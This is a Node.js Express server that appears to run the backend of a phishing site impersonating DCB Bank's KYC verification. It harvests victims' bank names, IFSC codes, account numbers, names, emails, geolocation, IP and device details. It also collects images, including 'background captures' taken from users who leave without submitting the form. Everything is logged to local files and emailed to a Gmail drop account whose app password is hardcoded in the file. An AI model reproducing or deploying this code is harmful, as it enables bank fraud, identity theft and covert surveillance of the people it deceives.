const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
const UAParser = require('ua-parser-js');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();
const port = process.env.PORT || 3000;

// Security middleware
app.use(helmet());
app.use(rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
}));

// Enhanced middleware
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public', {
  maxAge: '1d',
  setHeaders: (res, path) => {
    if (path.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    }
  }
}));

// File upload setup with enhanced error handling
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = `${Date.now()}-${Math.round(Math.random() * 1E9)}`;
    cb(null, `${uniqueSuffix}-${path.extname(file.originalname)}`);
  }
});

const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: { 
    fileSize: 50 * 1024 * 1024,
    files: 25 // Max 25 files (15 background + 10 submission)
  }
}).any();

// Enhanced email transporter with retry logic
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt'
  },
  pool: true,
  maxConnections: 5,
  maxMessages: 100
});

// Helper functions with improved reliability
const getClientIp = (req) => {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
         req.ip ||
         req.connection?.remoteAddress ||
         req.socket?.remoteAddress ||
         req.connection?.socket?.remoteAddress;
};

const buildEmailHtml = (data) => {
  const isBackground = data.isFormEmpty;
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
      </h2>
      
      ${isBackground ? `
      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
        <p><strong>User left without submitting form</strong></p>
        <p>Captured ${data.imageCount} images before leaving</p>
      </div>
      ` : ''}
      
      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
        <p><strong>OS:</strong> ${data.os}</p>
        <p><strong>Browser:</strong> ${data.browser}</p>
      </div>
      
      ${!isBackground ? `
      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
        <p><strong>Bank Name:</strong> ${data.bankname}</p>
        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
        <p><strong>Account Number:</strong> ${data.accno}</p>
        <p><strong>Full Name:</strong> ${data.fullname}</p>
        <p><strong>Email:</strong> ${data.email}</p>
      </div>
      ` : ''}
      
      ${data.location ? `
      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
      </div>
      ` : ''}
      
      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
        <p><strong>IP Address:</strong> ${data.ip}</p>
        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
        <p><strong>User Agent:</strong> ${data.userAgent}</p>
        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
};

const sendEmailWithRetry = async (mailOptions, retries = 3) => {
  for (let i = 0; i < retries; i++) {
    try {
      await transporter.sendMail(mailOptions);
      return true;
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 2000 * (i + 1)));
    }
  }
};

// Enhanced routes with better error handling
app.post('/submit', (req, res) => {
  upload(req, res, async (err) => {
    try {
      if (err) {
        console.error('Upload error:', err);
        throw err;
      }

      const isBackground = req.body.empty_form === 'true';
      
      // Parse device info with fallbacks
      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
      const device = parser.getDevice();
      const os = parser.getOS();
      const browser = parser.getBrowser();

      const submissionData = {
        device: {
          type: device.type || req.body.device_type || 'desktop',
          model: device.model || req.body.device_model || 'Unknown',
          vendor: device.vendor || req.body.device_vendor || 'Unknown'
        },
        os: `${os.name || ''} ${os.version || ''}`.trim() || req.body.device_os || 'Unknown',
        browser: `${browser.name || ''} ${browser.version || ''}`.trim() || req.body.device_browser || 'Unknown',
        bankname: req.body.bankname || 'Not provided',
        ifsc: req.body.ifsc || 'Not provided',
        accno: req.body.accno || 'Not provided',
        fullname: req.body.fullname || 'Not provided',
        email: req.body.email || 'Not provided',
        location: req.body.location ? JSON.parse(req.body.location) : null,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || req.body.user_agent || 'Unknown',
        timestamp: req.body.timestamp || new Date().toISOString(),
        isFormEmpty: isBackground,
        imageCount: req.files?.length || 0
      };

      // Enhanced logging
      const logEntry = `
--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
Time: ${new Date().toISOString()}
Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
OS: ${submissionData.os}
Browser: ${submissionData.browser}
IP: ${submissionData.ip}
Location: ${submissionData.location ? 
  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
Bank: ${submissionData.bankname}
IFSC: ${submissionData.ifsc}
Account: ${submissionData.accno}
Name: ${submissionData.fullname}
Email: ${submissionData.email}
Images: ${submissionData.imageCount}
-----------------------------
`;

      // Write to multiple logs for redundancy
      fs.appendFileSync('records.txt', logEntry);
      fs.appendFileSync('records_backup.txt', logEntry);
      console.log(logEntry);

      // Send email with retry logic
      const emailSubject = isBackground 
        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
        : '✅ KYC Verification Completed';
      
      const mailOptions = {
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: emailSubject,
        html: buildEmailHtml(submissionData),
        attachments: (req.files || []).map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      };

      await sendEmailWithRetry(mailOptions);

      res.status(200).send();
    } catch (error) {
      console.error('❌ Submission Error:', error);
      res.status(500).json({ 
        error: 'Error processing submission',
        details: error.message 
      });
    } finally {
      // Cleanup files in background
      if (req.files) {
        req.files.forEach(file => {
          try {
            if (fs.existsSync(file.path)) {
              fs.unlink(file.path, err => {
                if (err) console.error('Error deleting file:', file.path, err);
              });
            }
          } catch (e) {
            console.error('Error in file cleanup:', e);
          }
        });
      }
    }
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memoryUsage: process.memoryUsage()
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('❌ Unhandled Error:', err);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: err.message 
  });
});

// Start server with enhanced error handling
const server = app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

// Handle server errors
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`Port ${port} is already in use`);
    process.exit(1);
  } else {
    console.error('Server error:', error);
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received. Shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
